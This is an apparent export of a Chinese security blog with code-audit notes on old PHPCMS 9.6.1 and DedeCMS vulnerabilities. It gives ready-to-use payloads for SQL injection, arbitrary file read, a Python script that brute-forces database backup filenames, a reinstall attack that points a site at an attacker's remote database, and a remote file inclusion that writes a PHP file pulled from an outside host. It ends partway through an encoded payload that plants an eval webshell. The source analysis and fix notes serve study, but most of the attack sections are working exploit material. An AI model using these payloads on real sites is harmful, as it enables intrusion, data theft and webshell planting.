<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;aid&quot;:1,&quot;src&quot;:&quot;&amp;id&#x3D;%27 and updatexml(1,concat(1,(user())),1)#&amp;m&#x3D;1&amp;f&#x3D;haha&amp;modelid&#x3D;2&amp;catid&#x3D;7&amp;&quot;,&quot;filename&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>走到17行发现一个系统函数<code>parse_str</code> 这个函数用不好容易出现变量覆盖。可以自己查一下</p>
<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gshzz5ei7jj30s80ha11m.jpg" alt="image-20210715165137462"></p>
<p>我们知道用法了就是把<code>$id</code>给弄出来</p>
<p>然后直接到26行跟踪<code>get_one</code>函数，发现后面就直接执行语句了。</p>
<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gshzzdjm7dj614v0grqcu02.jpg" alt="image-20210715173420523"></p>
<p>肯定有人现在好奇那第三步为什么会得到这个值，我们返回到14行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a_k &#x3D; sys_auth($a_k, &#39;DECODE&#39;, pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;));</span><br></pre></td></tr></table></figure>

<p>我们怎么得到a_k的值，怎么得到的这个规范进行解密，因为他需要(‘system’,’auth_key’)我们并不知道</p>
<p>所以我们需要知道谁调用了这个函数</p>
<p>我们回到第二步的POC</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;attachment&amp;c&#x3D;attachments&amp;a&#x3D;swfupload_json&amp;aid&#x3D;1&amp;src&#x3D;&amp;id&#x3D;###payload###&amp;m&#x3D;1&amp;f&#x3D;haha&amp;modelid&#x3D;2&amp;catid&#x3D;7&amp;</span><br><span class="line"></span><br><span class="line">userid_flash&#x3D;Set-Cookie</span><br></pre></td></tr></table></figure>

<p>我们找到<code>attachment</code>模块下的<code>attachments</code>文件中的<code>swfupload_json</code>函数</p>
<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gshzzk7j73j30vw0bjjxp.jpg" alt="image-20210715175112616"></p>
<p>到<code>src</code>时有一个<code>safe_replace</code>函数我们跟进</p>
<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gshzzqgxsgj313b0h3gxn.jpg" alt="image-20210715183735791"></p>
<p>发现一个waf所以我们的src为什么要写成%*27的原因，就是为了绕过一次waf</p>
<p>继续到<code>set_cookie</code>我们跟进去发现<code>set_cookie</code>调用了<code>sys_auth</code>这个函数并且进行了<code>ENCODE</code>刚好我们又可以再前台看见</p>
<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gshzzvvhocj316r09xdnt.jpg" alt="image-20210715175343564"></p>
<p>至于我们为什么要传入一个POST值，是在<code>__construct</code>中如果没有这个<code>userid</code>他会<code>showmessage</code></p>
<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsi0020owtj3177063wjx.jpg" alt="image-20210715180755944"></p>
<p>而<code>userid</code>是17行的关键代码。我们肯定没有<code>userid</code>嘛所以三元表达式到第三个，他进行解密一次并且<code>userid=1</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$this-&gt;userid &#x3D; $_SESSION[&#39;userid&#39;] ? $_SESSION[&#39;userid&#39;] : (param::get_cookie(&#39;_userid&#39;) ? param::get_cookie(&#39;_userid&#39;) : sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;));</span><br></pre></td></tr></table></figure>

<p>现在POST值是怎么拿到的呢，回到第一步，访问的URL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;wap&amp;c&#x3D;index&amp;siteid&#x3D;1</span><br></pre></td></tr></table></figure>

<p>我们周到<code>wap</code>下的<code>index</code>下的<code>siteid</code> 而<code>siteid</code>直接就在<code>__construct</code>函数里面，于是经过一次<code>set_cookie</code>加密</p>
<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsi007ce39j30zf08gtfc.jpg" alt="image-20210715185530441"></p>
<p>我们现在来顺利一下整个过程</p>
<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gsi00c9wrvj30vk0ihh2a.jpg" alt="image-20210715193138877"></p>
<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>把$a_k过滤一次,把$id用<code>intval</code>过滤一次</p>
<h1 id="PHPCMS9-6-1任意文件读取"><a href="#PHPCMS9-6-1任意文件读取" class="headerlink" title="PHPCMS9.6.1任意文件读取"></a>PHPCMS9.6.1任意文件读取</h1><h2 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>步骤同上一个漏洞所以就不截图了</p>
<p>第一步访问把得到的set-cookie 记录下来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;wap&amp;c&#x3D;index&amp;siteid&#x3D;1 </span><br></pre></td></tr></table></figure>

<p>第二步访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;attachment&amp;c&#x3D;attachments&amp;a&#x3D;swfupload_json&amp;aid&#x3D;1&amp;src&#x3D;pad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3D.&#x2F;phpcms&#x2F;base%26f%3D.p%25253chp</span><br></pre></td></tr></table></figure>

<p>同样POST传递值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">userid_flash&#x3D;第一步获取的Set-cookie</span><br></pre></td></tr></table></figure>

<p>第三部访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;content&amp;c&#x3D;down&amp;a&#x3D;init&amp;a_k&#x3D;第二步获取的set-cookie</span><br></pre></td></tr></table></figure>

<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsi00ihqhnj30ww0dzq6g.jpg" alt="image-20210715201247818"></p>
<p>就可以下载我们要下载的文件</p>
<h2 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们还是和<code>wap_SQL注入</code>那样逆向分析一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;content&amp;c&#x3D;down&amp;a&#x3D;init&amp;a_k&#x3D;set-cookie</span><br></pre></td></tr></table></figure>

<p>经过解密之后</p>
<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gsi00nmiqfj316p06jdmj.jpg" alt="image-20210715205338895"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;aid&quot;:1,&quot;src&quot;:&quot;pad&#x3D;x&amp;i&#x3D;1&amp;modelid&#x3D;1&amp;catid&#x3D;1&amp;d&#x3D;1&amp;m&#x3D;1&amp;s&#x3D;.\&#x2F;phpcms\&#x2F;base&amp;f&#x3D;.p%253chp&quot;,&quot;filename&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>经过<code>safe_replace</code>处理之后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp;quotaid&amp;quot:1,&amp;quotsrc&amp;quot:&amp;quotpad&#x3D;x&amp;i&#x3D;1&amp;modelid&#x3D;1&amp;catid&#x3D;1&amp;d&#x3D;1&amp;m&#x3D;1&amp;s&#x3D;.&#x2F;phpcms&#x2F;base&amp;f&#x3D;.p%253chp&amp;quot,&amp;quotfilename&amp;quot:&amp;quot&amp;quot</span><br></pre></td></tr></table></figure>

<p>但是我们关键的是&amp;s和&amp;f没有任何变化</p>
<p>再经过<code>parse_str</code>处理我们的url会被解码一次</p>
<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gsi00rwoy1j311h03y0v5.jpg" alt="image-20210715205642241"></p>
<p><code>$f现在就是.p%3cphp</code></p>
<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gsi00w5ajdj315f0fg4d1.jpg" alt="image-20210715210151809"></p>
<p>然后<code>downurl</code>发生变化我们点击下载到download函数</p>
<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsi010iwqlj611y0i4du502.jpg" alt="image-20210715210928651"></p>
<p>经过一次解密再经过<code>parse_str</code>转码<code>%3c=&gt; &lt;</code></p>
<p>走到118行因为传递的m=1经过<code>$fileurl</code>把他拼接起来变成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\phpcms\base.p&lt;hp</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if($m) $fileurl &#x3D; trim($s).trim($fileurl);  &#x2F;&#x2F;118行代码</span><br></pre></td></tr></table></figure>

<p>然后走到125行进行随机名称生成，126行他又把<code>$fileurl</code>的&lt;给去掉了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$filename &#x3D; date(&#39;Ymd_his&#39;).random(3).&#39;.&#39;.$ext;      &#x2F;&#x2F;125</span><br><span class="line">$fileurl &#x3D; str_replace(array(&#39;&lt;&#39;,&#39;&gt;&#39;), &#39;&#39;,$fileurl);    &#x2F;&#x2F;126</span><br></pre></td></tr></table></figure>

<p>然后就进行一个原始下载。</p>
<p>第二部分和第一部分参考上面<code>wap_sql</code>注入,原理一样。我们现在梳理一下这个漏洞。</p>
<p>从最下面分析，他过滤了&lt;&gt; 然后到上面php等一些黑名单 那就P&lt;HP就可以</p>
<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gsi0155bxjj313q0gczvh.jpg" alt="image-20210715212632058"></p>
<p><code>$fileurl</code>是通过<code>$s</code>来的和<code>$f</code>来的。而<code>$f和$s</code>是通过构造<code>$a_k</code>来的，其中就<code>DECODE</code> 了两次</p>
<p>所以要通过<code>siteid=1</code>来进行<code>ENCODE</code>一次。我们为什么要传一个<code>userid_flash</code></p>
<p>因为<code>attachments</code>下的析构函数中的<code>userid</code>不能为空<br>而我们没登陆所以需要<code>sys_auth($_POST[&#39;userid_flash&#39;],DECODE&#39;)</code>解密一下传入的<code>userid_flash</code>使得<code>userid=1</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$this-&gt;userid &#x3D; $_SESSION[&#39;userid&#39;] ? $_SESSION[&#39;userid&#39;] :(param::get_cookie(&#39;_userid&#39;) ? param::get_cookie(&#39;_userid&#39;) :sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;));</span><br></pre></td></tr></table></figure>

<p>又经过<code>set_cookie(&#39;att_json&#39;,$json_str)</code>;然后又返回到前台<code>set-cookie</code></p>
<p>最终通过以下方法进行了下载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?m&#x3D;content&amp;c&#x3D;down&amp;a&#x3D;init&amp;a_k&#x3D;set-cookie</span><br></pre></td></tr></table></figure>

<h2 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><blockquote>
<p>官方V9.6.2是先过滤&lt;&gt;再进行php等黑名单过滤，我们还是可以继续通过空白字符来进行绕过的<br>%81-%99间的字符是不会被trim去掉的且在windows中还能正常访问到相应的文件。并且得到auth_key之后还可以进行其他的操作例如SQL注入等</p>
</blockquote>
<h1 id="PHPCMSV9暴力猜解数据库"><a href="#PHPCMSV9暴力猜解数据库" class="headerlink" title="PHPCMSV9暴力猜解数据库"></a>PHPCMSV9暴力猜解数据库</h1><blockquote>
<p>备份路径 \caches\bakup\default\xxxx.sql</p>
</blockquote>
<p>而问题出现在哪，我们先看POC。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">poc:</span><br><span class="line">&#x2F;api.php?op&#x3D;creatimg&amp;txt&#x3D;1&amp;font&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;caches&#x2F;bakup&#x2F;default&#x2F;s&lt;&lt;.sql</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gsi019u7foj30so0bsn67.jpg" alt="image-20210715221054129"></p>
<p>原因：</p>
<blockquote>
<p>windows的FindFirstFile（API)有个特性就是可以把&lt;&lt;当成通配符来用而PHP的opendir(win32readdir.c)就使用了该API。PHP的文件操作函数均调用了opendir,所以file_exists也有此特性。<br>pwaaov0zodprrm5371pe_db_20210715_1.sql<br>file_exists — opendir  – FindFirstFile – &lt;&lt;  通配符<br>file_exists  - &lt;&lt;  通配符<br>333xxxx.sql<br>3&lt;&lt;.sql<br>file_exists(3&lt;&lt;.sql)</p>
</blockquote>
<p>因为返回的只不同所以我们可以逐个猜解</p>
<p>附上斗鱼Sec脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">author: dysec</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">url</span>):</span></span><br><span class="line">    mark = <span class="literal">True</span></span><br><span class="line">    req = urllib2.Request(url)</span><br><span class="line">    req.add_header(<span class="string">&#x27;User-agent&#x27;</span>, <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&#x27;</span>)</span><br><span class="line">    response = urllib2.urlopen(req)</span><br><span class="line">    content = response.read()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Cannot&#x27;</span> <span class="keyword">in</span> content:</span><br><span class="line">        mark = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> mark</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guest</span>(<span class="params">target</span>):</span></span><br><span class="line">    arr = []</span><br><span class="line">    num = <span class="built_in">map</span>(<span class="built_in">chr</span>, <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">58</span>))</span><br><span class="line">    alpha = <span class="built_in">map</span>(<span class="built_in">chr</span>, <span class="built_in">range</span>(<span class="number">97</span>, <span class="number">123</span>))</span><br><span class="line">    exploit = <span class="string">&#x27;%s/api.php?op=creatimg&amp;txt=dysec&amp;font=/../../../../caches/bakup/default/%s%s&lt;&lt;.sql&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> num:</span><br><span class="line">            <span class="keyword">if</span> check(exploit % (target, <span class="string">&#x27;&#x27;</span>.join(arr), char)):</span><br><span class="line">                arr.append(char)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(arr) &lt; <span class="number">20</span>:</span><br><span class="line">                <span class="keyword">for</span> char <span class="keyword">in</span> alpha:</span><br><span class="line">                    <span class="keyword">if</span> check(exploit % (target, <span class="string">&#x27;&#x27;</span>.join(arr), char)):</span><br><span class="line">                        arr.append(char)</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">len</span>(arr) == <span class="number">20</span>:</span><br><span class="line">                arr.append(<span class="string">&#x27;_db_&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">len</span>(arr) == <span class="number">29</span>:</span><br><span class="line">                arr.append(<span class="string">&#x27;_1.sql&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(arr) &lt; <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;[*]not find!&#x27;</span></span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;[*]find: %s/caches/bakup/default/%s&#x27;</span> % (target, <span class="string">&#x27;&#x27;</span>.join(arr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">        url = <span class="string">&#x27;http://www.x.com&#x27;</span></span><br><span class="line">        <span class="comment">#test</span></span><br><span class="line">        guest(url)</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>DedeCMS历史版本代码审计学习</title>
    <url>/2021/07/18/DedeCMS%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<center>DEDECMS历史版本代码审计学习</center>

<blockquote>
<p>学习代码审计，自己简单记录一下。如有错误望师傅斧正。</p>
</blockquote>
<h1 id="DedeCMS重装漏洞"><a href="#DedeCMS重装漏洞" class="headerlink" title="DedeCMS重装漏洞"></a>DedeCMS重装漏洞</h1><p>这里我们用的版本是20120430，版本查看<code>/data/admin/ver.txt</code>。</p>
<p>一、首先这个漏洞的本质是 Apache的解析漏洞</p>
<p>参考以下文章分析Apache与php的结合方式的不同造成的结果</p>
<blockquote>
<p><a href="https://www.cnblogs.com/milantgh/p/5116955.html">https://www.cnblogs.com/milantgh/p/5116955.html</a><br><a href="https://blog.csdn.net/nuanyangH/article/details/105694856">https://blog.csdn.net/nuanyangH/article/details/105694856</a></p>
</blockquote>
<p>我们就当默认存在解析漏洞。当我们安装成功DedeCMS之后会在install下存在一个index.php.bak文件</p>
<p>访问的话会提示我们，如下图所示.</p>
<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gsl2d0171wj30qb04gdie.jpg" alt="image-20210716130510638"></p>
<p>但是呢漏洞代码在29行，如下 进行了变量覆盖</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foreach(Array(&#39;_GET&#39;,&#39;_POST&#39;,&#39;_COOKIE&#39;) as $_request)</span><br><span class="line">&#123;</span><br><span class="line">    foreach($$_request as $_k &#x3D;&gt; $_v) $&#123;$_k&#125; &#x3D; RunMagicQuotes($_v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据index.php.bak代码我们需要让$step=不同的值进行下一步的安装。所以我们的POC</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">install&#x2F;index.php.bak?insLockfile&#x3D;1&amp;step&#x3D;第几步</span><br></pre></td></tr></table></figure>

<p>所以我们用hackbar工具或者burp更加方便。</p>
<p>我们一直到step=3时，我们需要填写数据库的密码用户名了。如果简单的还好，但是复杂我们肯定猜不到</p>
<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gsl2c82a80j317v0ljdo6.jpg" alt="image-20210716130626543"></p>
<p>所以我们需要一个远程可连接的公网数据库,将数据库安装到我们服务器，网站还是在他的服务器。</p>
<p>POC如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;install&#x2F;index.php.bak?insLockfile&#x3D;1&amp;step&#x3D;4</span><br><span class="line"></span><br><span class="line">&#x2F;install&#x2F;index.php.bak?insLockfile&#x3D;1&amp;step&#x3D;4</span><br><span class="line">step&#x3D;4&amp;dbhost&#x3D;远程地址&amp;dbuser&#x3D;用户名&amp;dbpwd&#x3D;密码&amp;dbprefix&#x3D;dede_&amp;dbname&#x3D;dede111&amp;dblang&#x3D;gbk&amp;adminuser&#x3D;admin&amp;adminpwd&#x3D;admin&amp;cookieencode&#x3D;JzIVw7439H&amp;webname&#x3D;1111&amp;adminmail&#x3D;admin@dedecms.com&amp;baseurl&#x3D;http:&#x2F;&#x2F;www.xxx.com&amp;cmspath&#x3D;</span><br></pre></td></tr></table></figure>

<h1 id="DedeCMS远程文件包含漏洞GETSHELL"><a href="#DedeCMS远程文件包含漏洞GETSHELL" class="headerlink" title="DedeCMS远程文件包含漏洞GETSHELL"></a>DedeCMS远程文件包含漏洞GETSHELL</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这里我们用的版本是20120430，版本查看<code>/data/admin/ver.txt</code>。<br>第一步我们需要准备一个远程文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.x.com&#x2F;dedecms&#x2F;demodata.a.txt  &#x2F;&#x2F;必须这样子命名 a可以变化</span><br></pre></td></tr></table></figure>

<p>第二步先访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.x.com&#x2F;install&#x2F;index.php.bak?step&#x3D;11&amp;insLockfile&#x3D;a&amp;s_lang&#x3D;a&amp;install_demo_name&#x3D;..&#x2F;data&#x2F;admin&#x2F;config_update.php</span><br></pre></td></tr></table></figure>

<p>我们查看结果，返回   [×] 远程获取失败</p>
<p>第三步我们再访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.x.com&#x2F;install&#x2F;index.php.bak?step&#x3D;11&amp;insLockfile&#x3D;a&amp;s_lang&#x3D;a&amp;install_demo_name&#x3D;2021716.php&amp;updateHost&#x3D;http:&#x2F;&#x2F;www.s.com&#x2F;</span><br></pre></td></tr></table></figure>

<p>  [√] 存在(您可以选择安装进行体验)。即可生成<a href="http://www.x.com/install/2021716.php">http://www.x.com/install/2021716.php</a> </p>
<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gsl2d7emtzj613v0gvalh02.jpg" alt="image-20210716132307780"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞其实还是在index.php.bak中我们发现POC中的step变成了11。我们直接去代码查看</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$step</span>==<span class="number">11</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;../data/admin/config_update.php&#x27;</span>);</span><br><span class="line">	<span class="variable">$rmurl</span> = <span class="variable">$updateHost</span>.<span class="string">&quot;dedecms/demodata.<span class="subst">&#123;$s_lang&#125;</span>.txt&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$sql_content</span> = file_get_contents(<span class="variable">$rmurl</span>);</span><br><span class="line">	<span class="variable">$fp</span> = fopen(<span class="variable">$install_demo_name</span>,<span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(fwrite(<span class="variable">$fp</span>,<span class="variable">$sql_content</span>))</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&amp;nbsp; &lt;font color=&quot;green&quot;&gt;[√]&lt;/font&gt; 存在(您可以选择安装进行体验)&#x27;</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&amp;nbsp; &lt;font color=&quot;red&quot;&gt;[×]&lt;/font&gt; 远程获取失败&#x27;</span>;</span><br><span class="line">	<span class="keyword">unset</span>(<span class="variable">$sql_content</span>);</span><br><span class="line">	fclose(<span class="variable">$fp</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先包含文件<code>/data/admin/config_update.php</code>我们去查看时发现已经被我们覆盖没有了，我们查看原文件</p>
<p>其实就是两个变量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$updateHost &#x3D; &#39;http:&#x2F;&#x2F;updatenew.dedecms.com&#x2F;base-v57&#x2F;&#39;;</span><br><span class="line">$linkHost &#x3D; &#39;http:&#x2F;&#x2F;flink.dedecms.com&#x2F;server_url.php&#39;;</span><br></pre></td></tr></table></figure>

<p>然后我们查看我们POC不难分析出通过<code>$rmurl</code>就是拼接这个两个东西成一个网址</p>
<p><code>file_get_contents</code>去获取然后给<code>$sql_content</code>然后打开<code>$install_demo_name</code>把<code>file_get_contents</code>获取的东西给<code>$fp</code>然后判断。</p>
<p>所以我们看我们两个关键的的POC</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://www.x.com/install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=../data/admin/config_update.php</span><br><span class="line"></span><br><span class="line">http://www.x.com/install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=2021716.php&amp;updateHost=http://www.s.com/</span><br></pre></td></tr></table></figure>

<p><code>step=11</code>为了到执行我们的升级。<code>insLockfile=a</code>为了我们进行安装覆盖原来的函数</p>
<p><code>s_lang</code>为了拼接<code>&#123;$s_lang&#125;.txt&quot;;</code>这个东西。<code>install_demo_name</code>就是一个文件命名</p>
<p><code>updateHost</code>就是为了传递我们的URL</p>
<p>所以回到第二步<code>$updateHost.&quot;dedecms/demodata.&#123;$s_lang&#125;.txt&quot;;</code>就是为了获取一个不存在文件</p>
<p><code>然后install_demo_name=../data/admin/config_update.php</code>就是为了把原文件给覆盖掉。</p>
<p>然后我们第三步才可以传入自己的<code>updateHost</code></p>
<h1 id="DedeCMS的download文件SQL注入和GEThsell"><a href="#DedeCMS的download文件SQL注入和GEThsell" class="headerlink" title="DedeCMS的download文件SQL注入和GEThsell"></a>DedeCMS的download文件SQL注入和GEThsell</h1><p>这里我们用的版本是20120430</p>
<blockquote>
<p>条件：</p>
<p>CMS版本 &lt; 20130425     //版本查看/data/admin/ver.txt</p>
<p>PHP关闭mysqli</p>
</blockquote>
<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>第一步访问我们获取shell的POC</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;plus&#x2F;download.php?open&#x3D;1&amp;arrs1[]&#x3D;99&amp;arrs1[]&#x3D;102&amp;arrs1[]&#x3D;103&amp;arrs1[]&#x3D;95&amp;arrs1[]&#x3D;100&amp;arrs1[]&#x3D;98&amp;arrs1[]&#x3D;112&amp;arrs1[]&#x3D;114&amp;arrs1[]&#x3D;101&amp;arrs1[]&#x3D;102&amp;arrs1[]&#x3D;105&amp;arrs1[]&#x3D;120&amp;arrs2[]&#x3D;109&amp;arrs2[]&#x3D;121&amp;arrs2[]&#x3D;116&amp;arrs2[]&#x3D;97&amp;arrs2[]&#x3D;103&amp;arrs2[]&#x3D;96&amp;arrs2[]&#x3D;32&amp;arrs2[]&#x3D;40&amp;arrs2[]&#x3D;97&amp;arrs2[]&#x3D;105&amp;arrs2[]&#x3D;100&amp;arrs2[]&#x3D;44&amp;arrs2[]&#x3D;101&amp;arrs2[]&#x3D;120&amp;arrs2[]&#x3D;112&amp;arrs2[]&#x3D;98&amp;arrs2[]&#x3D;111&amp;arrs2[]&#x3D;100&amp;arrs2[]&#x3D;121&amp;arrs2[]&#x3D;44&amp;arrs2[]&#x3D;110&amp;arrs2[]&#x3D;111&amp;arrs2[]&#x3D;114&amp;arrs2[]&#x3D;109&amp;arrs2[]&#x3D;98&amp;arrs2[]&#x3D;111&amp;arrs2[]&#x3D;100&amp;arrs2[]&#x3D;121&amp;arrs2[]&#x3D;41&amp;arrs2[]&#x3D;32&amp;arrs2[]&#x3D;86&amp;arrs2[]&#x3D;65&amp;arrs2[]&#x3D;76&amp;arrs2[]&#x3D;85&amp;arrs2[]&#x3D;69&amp;arrs2[]&#x3D;83&amp;arrs2[]&#x3D;40&amp;arrs2[]&#x3D;49&amp;arrs2[]&#x3D;52&amp;arrs2[]&#x3D;48&amp;arrs2[]&#x3D;44&amp;arrs2[]&#x3D;64&amp;arrs2[]&#x3D;96&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;96&amp;arrs2[]&#x3D;44&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;123&amp;arrs2[]&#x3D;100&amp;arrs2[]&#x3D;101&amp;arrs2[]&#x3D;100&amp;arrs2[]&#x3D;101&amp;arrs2[]&#x3D;58&amp;arrs2[]&#x3D;112&amp;arrs2[]&#x3D;104&amp;arrs2[]&#x3D;112&amp;arrs2[]&#x3D;125&amp;arrs2[]&#x3D;102&amp;arrs2[]&#x3D;105&amp;arrs2[]&#x3D;108&amp;arrs2[]&#x3D;101&amp;arrs2[]&#x3D;95&amp;arrs2[]&#x3D;112&amp;arrs2[]&#x3D;117&amp;arrs2[]&#x3D;116&amp;arrs2[]&#x3D;95&amp;arrs2[]&#x3D;99&amp;arrs2[]&#x3D;111&amp;arrs2[]&#x3D;110&amp;arrs2[]&#x3D;116&amp;arrs2[]&#x3D;101&amp;arrs2[]&#x3D;110&amp;arrs2[]&#x3D;116&amp;arrs2[]&#x3D;115&amp;arrs2[]&#x3D;40&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;102&amp;arrs2[]&#x3D;108&amp;arrs2[]&#x3D;121&amp;arrs2[]&#x3D;46&amp;arrs2[]&#x3D;112&amp;arrs2[]&#x3D;104&amp;arrs2[]&#x3D;112&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;44&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;60&amp;arrs2[]&#x3D;63&amp;arrs2[]&#x3D;112&amp;arrs2[]&#x3D;104&amp;arrs2[]&#x3D;112&amp;arrs2[]&#x3D;32&amp;arrs2[]&#x3D;101&amp;arrs2[]&#x3D;118&amp;arrs2[]&#x3D;97&amp;arrs2[]&#x3D;108&amp;arrs2[]&#x3D;40&amp;arrs2[]&#x3D;36&amp;arrs2[]&#x3D;95&amp;arrs2[]&#x3D;80&amp;arrs2[]&#x3D;79&amp;arrs2[]&#x3D;83&amp;arrs2[]&#x3D;84&amp;arrs2[]&#x3D;91